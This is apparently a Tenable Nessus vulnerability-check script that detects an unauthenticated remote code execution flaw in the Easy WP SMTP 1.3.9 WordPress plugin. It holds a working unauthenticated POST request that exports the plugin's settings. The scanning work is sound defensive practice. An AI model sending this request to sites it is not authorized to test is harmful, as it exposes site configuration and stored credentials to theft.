#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(123004);
  script_version("1.1");
  script_cvs_date("Date: 2019/03/22  9:44:10");

  script_name(english:"Easy WP SMTP Plugin for WordPress 1.3.9 Unauthenticated Remote Code Execution");
  script_summary(english:"Checks for vulnerability.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server is running a PHP application that is affected
by an unauthenticated remote code execution vulnerability.");

  script_set_attribute(attribute:"description", value:
"The Easy WP SMTP Plugin for WordPress running on the remote web server
is version 1.3.9. It is, therefore, affected by an unauthenticated
remote code execution vulnerability.");
  # https://blog.nintechnet.com/critical-0day-vulnerability-fixed-in-wordpress-easy-wp-smtp-plugin/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b5c5034f");
  script_set_attribute(attribute:"see_also", value:"https://wordpress.org/plugins/easy-wp-smtp/");
  script_set_attribute(attribute:"solution", value:
"Upgrade the Easy WP SMTP Plugin for WordPress to version
1.3.9.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"Remote Code Execution");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/03/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/03/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/03/22");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("wordpress_detect.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");
include("misc_func.inc");
include("data_protection.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(app_name:app, port:port);

dir = install["path"];
install_url = build_url(port:port, qs:dir);

url = install_url + "wp-admin/admin-post.php?page=swpsmtp_settings";

plugin_name = "Easy WP SMTP";

post_payload = "swpsmtp_export_settings=1";
headers = make_array(
  "Content-Type", "application/x-www-form-urlencoded",
  "Content-Length", strlen(post_payload)
);

res = http_send_recv3(
  method:"POST",
  port:port,
  item:url,
  data:post_payload,
  add_headers:headers,
  exit_on_fail:TRUE
);

if ("swpsmtp_options" >< res[2])
{
  security_report_v4(
    port:port,
    severity:SECURITY_HOLE,
    request:make_list(http_last_sent_request()),
    output:data_protection::sanitize_user_full_redaction(output:res[2]),
    generic:TRUE
  );
}
else audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin_name + ' plugin');
